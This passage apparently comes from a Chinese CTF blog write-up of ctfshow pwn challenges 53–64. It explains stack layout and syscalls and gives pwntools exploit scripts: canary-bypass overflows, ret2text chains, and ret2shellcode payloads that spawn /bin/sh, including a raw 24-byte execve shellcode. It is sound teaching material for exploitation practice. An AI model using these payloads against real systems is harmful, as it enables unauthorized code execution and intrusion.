<h3 id="pwntools：大端序和小端序"><a href="#pwntools：大端序和小端序" class="headerlink" title="pwntools：大端序和小端序"></a>pwntools：大端序和小端序</h3><p>疑问：这里的’1231’为什么传入的时候没有考虑小端序传入呢？</p>
<p>答：因为这里的每一位使用p8(逐位包装)的，如果字符串用p32(进行包装)，是有小端序问题的，请看内存</p>
<p>解题代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag = elf.symbols[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += canary</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(flag)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn54（利用内存布局栈溢出）"><a href="#pwn54（利用内存布局栈溢出）" class="headerlink" title="pwn54（利用内存布局栈溢出）"></a>pwn54（利用内存布局栈溢出）</h2><p>IDA 反汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input_pass[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> username[<span class="number">256</span>]; <span class="comment">// [esp+40h] [ebp-160h] BYREF</span></span><br><span class="line">  <span class="type">char</span> password[<span class="number">64</span>]; <span class="comment">// [esp+140h] [ebp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> passwordtxt; <span class="comment">// [esp+180h] [ebp-20h]</span></span><br><span class="line">  _BYTE *lastChr <span class="comment">// [esp+184h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+188h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+18Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+190h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+194h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="keyword">sizeof</span>(password));</span><br><span class="line">  <span class="built_in">memset</span>(username, <span class="number">0</span>, <span class="keyword">sizeof</span>(username));</span><br><span class="line">  <span class="built_in">memset</span>(input_pass, <span class="number">0</span>, <span class="keyword">sizeof</span>(input_pass));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==========CTFshow-LOGIN==========&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Username:&quot;</span>);</span><br><span class="line">  fgets(username, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  lastChr = <span class="built_in">strchr</span>(username, <span class="number">10</span>); <span class="comment">// assic的值是回车键</span></span><br><span class="line">  <span class="keyword">if</span> ( lastChr )</span><br><span class="line">    *lastChr = <span class="number">0</span>;  <span class="comment">// 这里将输入最后的一个回车键变成了字符串终结符/0</span></span><br><span class="line">  <span class="built_in">strcat</span>(username, <span class="string">&quot;,\nInput your Password.&quot;</span>);<span class="comment">// 将这个字符串拼接到username后面</span></span><br><span class="line">  passwordtxt = fopen(<span class="string">&quot;/password.txt&quot;</span>, &amp;unk_8048A30);</span><br><span class="line">  <span class="keyword">if</span> ( !passwordtxt )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/password.txt: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>, v9, v10, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(password, <span class="number">64</span>, passwordtxt);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(username);</span><br><span class="line">  fgets(input_pass, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  username[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input_pass, password) )         </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome! Here&#x27;s what you want:&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">        <span class="string">&quot;You has been banned!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="puts函数特性"><a href="#puts函数特性" class="headerlink" title="puts函数特性"></a>puts函数特性</h3><ul>
<li><p>特性：puts函数输出的东西遇到空格(\0 \x00)就会截断，遇到回车和制表符不会，运行一下代码即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    puts(<span class="string">&quot;123\n\t456\x00*****&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p><code>\x00</code> 使用了 ASCII 转义序列，其中 <code>\x</code> 表示后面紧跟着两个十六进制数字，表示字符的 ASCII 值。因此，<code>\x00</code> 表示 ASCII 值为 0 的字符。</p>
<p><code>\0</code> 则是一种更为简短的表示方式，直接使用了八进制转义序列，其中 <code>\0</code> 表示后面紧跟着一个八进制数字，同样表示字符的 ASCII 值。在这种情况下，<code>\0</code> 表示 ASCII 值为 0 的字符。</p>
</blockquote>
<p>我的思路</p>
<ul>
<li>我当时想着是能不能通过passwd的写入去覆盖原来读入passwd的栈空间，从而强行达到密码一致</li>
<li>那么问题来了，经过多次实验，发现不可以的，因为这个函数运用的是fgets函数，无法造成栈溢出</li>
</ul>
<h3 id="思路-考点"><a href="#思路-考点" class="headerlink" title="思路&amp;考点"></a>思路&amp;考点</h3><ul>
<li><p>很容易得出栈空间的布局关系</p>
<ul>
<li>000001A0 	input_passwd</li>
<li>00000160     username</li>
<li>00000060     passwd </li>
<li>00000020     passwdtxt </li>
<li>0000001C    isOpen</li>
</ul>
</li>
<li><p>思路：如何可以读出栈空间的passwdtxt呢？</p>
</li>
<li><p>这里的关键：puts函数（上面有讲解）</p>
<p>fgets函数会自带一个回车，于是我们可以输入<code>username</code>0x100个字符，这样的栈空间就没有<code>\n</code>的回车符了</p>
</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">passwd = re.findall(<span class="string">&quot;CTF.*\n&quot;</span>,  p.recvuntil(<span class="string">&#x27;You has been banned!&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">1</span>]</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<h2 id="pwn55-根据函数调用关系拼接payload"><a href="#pwn55-根据函数调用关系拼接payload" class="headerlink" title="pwn55(根据函数调用关系拼接payload)"></a>pwn55(根据函数调用关系拼接payload)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag = elf.symbols[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">flag_func1 = elf.symbols[<span class="string">&#x27;flag_func1&#x27;</span>]</span><br><span class="line">flag_func2 = elf.symbols[<span class="string">&#x27;flag_func2&#x27;</span>]</span><br><span class="line"><span class="comment"># flag argv</span></span><br><span class="line">a1 = <span class="number">0xBDBDBDBD</span></span><br><span class="line"><span class="comment"># flag2 argv </span></span><br><span class="line">a2 = <span class="number">0xACACACAC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2C</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(flag_func1) </span><br><span class="line">payload += p32(flag_func2)</span><br><span class="line">payload += p32(flag)</span><br><span class="line">payload += p32(a2)</span><br><span class="line">payload += p32(a1)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your flag:&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn56-57-32位-64位-shellcode分析"><a href="#pwn56-57-32位-64位-shellcode分析" class="headerlink" title="pwn56&#x2F;57(32位  64位  shellcode分析)"></a>pwn56&#x2F;57(32位  64位  shellcode分析)</h2><h3 id="32位解析"><a href="#32位解析" class="headerlink" title="32位解析"></a>32位解析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">push    68h </span><br><span class="line">; 小端序传参 /bin/sh</span><br><span class="line">push    732F2F2Fh	; &quot;sh//&quot;</span><br><span class="line">push    6E69622Fh	; &quot;/bin&quot;</span><br><span class="line">; 将栈顶的地址（即字符串 &quot;/bin/sh&quot; 的起始地址）复制给寄存器 ebx 。ebx寄存器将用作execve 系统调用的第一个参数</span><br><span class="line">mov     ebx, esp </span><br><span class="line">; int 80 执行系统调用的参数</span><br><span class="line">xor     ecx, ecx             </span><br><span class="line">xor     edx, edx             </span><br><span class="line">push    0Bh 		; 送入系统调用号   11表示execve</span><br><span class="line">pop     eax			; 弹出到eax进行系统调用</span><br><span class="line">int     80h     </span><br></pre></td></tr></table></figure>

<h3 id="execve函数原型"><a href="#execve函数原型" class="headerlink" title="execve函数原型"></a>execve函数原型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>                        </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[],<span class="type">char</span> *<span class="type">const</span> envp[])</span>;  </span><br></pre></td></tr></table></figure>

<h3 id="系统调用介绍"><a href="#系统调用介绍" class="headerlink" title="系统调用介绍"></a>系统调用介绍</h3><ul>
<li><p><strong>代码触发中断 0x80 ，这是Linux系统中用于执行系统调用的中断指令。通过设置适当的寄存器值（ eax 、ebx 、ecx 、edx ）， int 0x80 指令将执行 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL) 系统调用，从而启动一个新的 shell 进程。</strong></p>
<blockquote>
<p>在Linux系统中，系统调用是用户空间程序与内核之间进行通信的一种机制，允许用户程序请求内核执行特权操作。在x86架构上，用于触发系统调用的中断指令是<code>int 0x80</code>。不过，随着时间的推移，32位和64位系统在系统调用方面有了一些变化。</p>
<h3 id="32位系统中的系统调用（x86）"><a href="#32位系统中的系统调用（x86）" class="headerlink" title="32位系统中的系统调用（x86）"></a>32位系统中的系统调用（x86）</h3><p>在32位x86系统中，使用中断0x80来触发系统调用是一种常见的方法。要执行一个系统调用，您需要在寄存器中设置相应的值，然后使用<code>int 0x80</code>指令触发中断。下面是一个简单的步骤示例：</p>
<ol>
<li>将系统调用号放入<code>eax</code>寄存器。</li>
<li>将系统调用的参数放入适当的寄存器，如<code>ebx</code>、<code>ecx</code>、<code>edx</code>、<code>esi</code>、<code>edi</code>等，具体取决于系统调用的参数个数和类型。</li>
<li>使用<code>int 0x80</code>指令触发中断，切换到内核态执行系统调用。</li>
<li>系统调用完成后，返回值通常会存储在<code>eax</code>寄存器中。</li>
</ol>
<h3 id="64位系统中的系统调用（x86-64）"><a href="#64位系统中的系统调用（x86-64）" class="headerlink" title="64位系统中的系统调用（x86_64）"></a>64位系统中的系统调用（x86_64）</h3><p>在64位x86_64系统中，使用中断0x80的方式不再是首选。相反，系统调用是通过使用<code>syscall</code>指令来实现的，它是一种更为现代和高效的方法。在x86_64架构下，系统调用的过程如下：</p>
<ol>
<li>将系统调用号放入<code>rax</code>寄存器。</li>
<li>将系统调用的参数放入<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code>寄存器，具体取决于系统调用的参数个数和类型。</li>
<li>使用<code>syscall</code>指令触发系统调用，切换到内核态执行系统调用。</li>
<li>系统调用完成后，返回值通常会存储在<code>rax</code>寄存器中。</li>
</ol>
<p>这种方式相较于中断0x80，具有更高的性能和更好的寄存器利用率，因此在64位系统中更为常见。</p>
</blockquote>
</li>
<li><p>注：64位类似，不再赘述</p>
</li>
</ul>
<h2 id="pwn58-59（ret2shellcode）"><a href="#pwn58-59（ret2shellcode）" class="headerlink" title="pwn58&#x2F;59（ret2shellcode）"></a>pwn58&#x2F;59（ret2shellcode）</h2><p>32e位不再赘述，这里说明64位寄存器读写问题，如果函数没有局部变量，那么是没有栈空间的，所以如果遇到危险函数栈溢出的话，有可能在寄存器进行栈溢出。</p>
<p>比如这串代码，在input中a1是没有局部变量的，是一个形式参数，所以理论上在input函数中gets的值是不在栈空间的，通过编译32位和64位可以得到简单结论（这里的操作最容易晕的是，用ida习惯性的查看读写变量的偏移发现点不进去）</p>
<ul>
<li>32位，直接优化代码然后利用main函数的栈空间进行读写</li>
<li>64位，直接在寄存器的空间进行读写和覆盖</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">(<span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">gets</span>(a1);</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *a1;</span><br><span class="line">    <span class="built_in">input</span>(&amp;a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个题目就是直接送shellcode，刚开始理解，对于main函数执行完以后无法返回到shellcode，那么程序是如何执行shellcode的呢？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>gdb调试查看,发现奥秘了,leave会将栈空间清除，导致main函数栈空间的局部变量等都会受到影响。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x8048545 &lt;ctfshow+47&gt;    mov    ebx, dword ptr [ebp - 4]      &lt;_GLOBAL_OFFSET_TABLE_&gt;</span><br><span class="line">0x8048548 &lt;ctfshow+50&gt;    leave  </span><br><span class="line">0x8048549 &lt;ctfshow+51&gt;    ret    </span><br></pre></td></tr></table></figure>

<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230816015043315.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230816015043315.png"  class="" lazyload></a>

<p>栈空间在leave之后，刚好作为返回地址继续执行shellcode。</p>
<h2 id="pwn60-vmmap本地权限问题"><a href="#pwn60-vmmap本地权限问题" class="headerlink" title="pwn60(vmmap本地权限问题)"></a>pwn60(vmmap本地权限问题)</h2><p>在pwn60中，题目是一个很简单的题目，但是这里还是有一个关于vmmap的小点记录一下<br>先看解题代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf2_addr = <span class="number">0x804a080</span> <span class="comment"># bss段落 </span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf2_addr)</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是无法运行，用gdb查看的时候发现bss段没有执行权限，这个一般是文件有问题（**PS:**IDA中用CTRL+S调出各个段bss段也是没有可执行权限的），但是远程可以打通的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     Start        End Perm     Size Offset File</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000      0 /mnt/d/Yixin/Desktop/CTFdemo/pwn</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000      0 /mnt/d/Yixin/Desktop/CTFdemo/pwn</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000   1000 /mnt/d/Yixin/Desktop/CTFdemo/pwn</span><br><span class="line"> 0x9b64000  0x9b86000 rw-p    22000      0 [heap]</span><br></pre></td></tr></table></figure>



<h2 id="pwn61（leave-ret和ret命令）"><a href="#pwn61（leave-ret和ret命令）" class="headerlink" title="pwn61（leave ret和ret命令）"></a>pwn61（leave ret和ret命令）</h2><p>在ROP链中的作用：</p>
<ul>
<li>RET：用于栈平衡的例子</li>
<li>LEAVE RET：用于栈迁移的情形</li>
</ul>
<p>三种函数返回汇编的区别：</p>
<blockquote>
<ol>
<li><strong>RET</strong>：<ul>
<li><code>RET</code>（Return）是用于函数返回的指令。它从被调用函数返回到调用者，同时恢复之前保存在栈上的返回地址。</li>
<li>在使用 <code>CALL</code> 指令调用函数时，调用者会将返回地址压入栈中。<code>RET</code> 指令会将栈顶的值弹出，并将控制权转移到该地址，从而返回到调用者函数。</li>
<li><code>RET</code> 指令没有参数，因为它假定返回地址已经保存在栈上。</li>
</ul>
</li>
<li><strong>LEAVE</strong>：<ul>
<li><code>LEAVE</code> 指令常用于函数的收尾部分，用于清理函数的栈帧。它执行两个操作：首先，将栈顶的值（即基址寄存器 <code>EBP</code> 的值）赋值给栈指针寄存器 <code>ESP</code>，从而恢复栈的位置；然后，从栈中弹出当前函数的,基址，即恢复上一个函数的栈帧。</li>
<li><code>LEAVE</code> 指令通常用于函数的返回前，用于恢复栈帧并清理栈上的局部变量。</li>
<li>相当于：MOV ESP,EBP ; POP EBP</li>
</ul>
</li>
<li><strong>RETN</strong>：<ul>
<li><code>RETN</code> 指令在一些特定的体系结构或汇编语言中用于函数返回。与其他指令不同，<code>RETN</code> 可能带有一个参数，用于指定从堆栈中弹出的字节数，而不仅仅是返回地址。</li>
<li>这个指定的字节数可能包括返回地址以及其他一些函数调用过程中保存在栈上的数据。在一些体系结构中，由于函数调用的约定可能涉及堆栈清理，因此 <code>RETN</code> 的参数允许在返回时清理堆栈上的数据。</li>
</ul>
</li>
</ol>
<p><code>RET</code> 用于简单的函数返回，<code>LEAVE</code> 用于清理栈帧局部变量等，而 <code>RETN</code> 在某些体系结构中用于带有堆栈清理的函数返回。具体在某种汇编语言中使用哪个指令取决于体系结构和编程约定。</p>
</blockquote>
<p>这道题main函数的返回指令就是leave ret，这样的话，函数返回以后因为栈空间的改变，无法使用原来局部变量的栈空间了。</p>


<p>而因为rsp的下一个地址空间是返回地址，也不能放shellcode，所以需要将shellcode放入v5+24+8的位置，返回地址填入shellcode的地址即可。</p>
<blockquote>
<p>一个点：当时调试的时候一直想着把shellcode放到返回地址不就可以执行了吗？然后调试才可以理解，这里需要放的是：shellcode的地址，而不是shellcode本身。比如你要操作的方向盘，而不是车子本身。</p>
</blockquote>
<p>解题代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有简单的写法</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;[&#x27;)</span></span><br><span class="line"><span class="comment"># v5 = io.recvuntil(&#x27;]&#x27;, drop=True)</span></span><br><span class="line"><span class="comment"># v5 = int(v5, 16)</span></span><br><span class="line">v5 = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;]&#x27;</span>).split(<span class="string">b&#x27;[&#x27;</span>)[<span class="number">1</span>].split(<span class="string">b&#x27;]&#x27;</span>)[<span class="number">0</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># p64(v5+24+8)是shellcode的存放地址，让rip指针返回到shellcode本事即可</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(v5+<span class="number">24</span>+<span class="number">8</span>) + shellcode</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn62-63-shellcode-长度限制"><a href="#pwn62-63-shellcode-长度限制" class="headerlink" title="pwn62&#x2F;63(shellcode 长度限制)"></a>pwn62&#x2F;63(shellcode 长度限制)</h2><p>在线网站:<a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/43550">https://www.exploit-db.com/shellcodes/43550</a></p>
<p>读入的是0x38个字符，除去不可读写的空间（0x38 - 0x18 - 0x8 &#x3D; 24 ）位的shellcode了，那么pwntools自带的shellcode是肯定不行的，可以找短一点的shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode =<span class="string">b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(buf+<span class="number">0x20</span>) + shellcode</span><br></pre></td></tr></table></figure>

<h2 id="pwn64-mmap函数"><a href="#pwn64-mmap函数" class="headerlink" title="pwn64(mmap函数)"></a>pwn64(mmap函数)</h2><p>这个是开了nx保护，但是用mmap函数对空间赋予了可写可读可执行权限，这里简单说明mmap函数<code>mmap</code>（Memory Map）是一个在Unix-like操作系统中的系统调用，用于在进程的地址空间中创建一个新的内存映射区域，从而将磁盘文件或其他设备的内容映射到内存中。它可以用于多种目的，包括文件I&#x2F;O、进程间通信（如共享内存）、零拷贝技术等。</p>
<p>以下是关于<code>mmap</code>函数的一些解析：</p>
<p><strong>函数原型：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cCopy code</span><br><span class="line">void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>addr</code>: 希望映射的内存起始地址，通常设置为0，由系统自动分配。</li>
<li><code>length</code>: 映射的内存区域大小（字节数）。</li>
<li><code>prot</code>:内存保护标志，指定内存区域的访问权限，可以是以下几个值的按位或组合：<ul>
<li><code>PROT_NONE</code>: 无访问权限。</li>
<li><code>PROT_READ</code>: 可读取。</li>
<li><code>PROT_WRITE</code>: 可写入。</li>
<li><code>PROT_EXEC</code>: 可执行。</li>
</ul>
</li>
<li>flags: 控制内存映射的方式和行为，可以是以下值的按位或组合：<ul>
<li><code>MAP_SHARED</code>: 允许多个进程共享映射区域的内容，对映射区域的修改会反映到所有共享该区域的进程。</li>
<li><code>MAP_PRIVATE</code>: 创建一个私有映射区域，对映射区域的修改不会影响其他进程。</li>
<li><code>MAP_ANONYMOUS</code>: 创建一个匿名映射区域，不与任何文件关联，可以用于零拷贝技术和进程间通信。</li>
</ul>
</li>
<li><code>fd</code>: 打开的文件描述符，用于关联一个文件到映射区域。如果不需要关联文件，可以传入-1。</li>
<li><code>offset</code>: 文件中的偏移量，表示映射区域开始的位置。对于无需关联文件的情况，通常设置为0。</li>
</ul>
<p><strong>返回值：</strong></p>
<ul>
<li>成功时，返回映射区域的起始地址。</li>
<li>失败时，返回<code>MAP_FAILED</code>（通常是<code>(void *)-1</code>），并设置<code>errno</code>以指示错误原因。</li>
</ul>
<p><strong>注意</strong>：以下代码中，buf的地址并不和返回的地址addr一样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">size_t length1 = <span class="number">4096</span>;</span><br><span class="line">   <span class="built_in">int</span> b;</span><br><span class="line">   void *buf = &amp;b;</span><br><span class="line">   void *addr1 = mmap(buf, length1, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (addr1 == MAP_FAILED) &#123;</span><br><span class="line">       perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   printf(<span class="string">&quot;Buf address: %p\n&quot;</span>, buf);</span><br><span class="line">   printf(<span class="string">&quot;Mapped address: %p\n&quot;</span>, addr1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

